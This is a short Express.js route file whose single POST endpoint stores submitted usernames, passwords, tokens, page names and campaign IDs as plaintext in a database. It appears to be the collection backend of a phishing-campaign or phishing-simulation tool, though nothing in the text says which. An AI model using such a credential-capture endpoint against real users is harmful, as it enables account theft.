const router = require('express').Router();
const { InformationData } = require('../../server/models');

router.post('/submit_information', async (req, res) => {
    try {
        const { username, password, token, page, campaignId } = req.body;
    
        await InformationData.create({
            username: username,
            password: password,
            page: page,
            token: token,
            CampaignId: campaignId
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error saving information data:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

module.exports = router;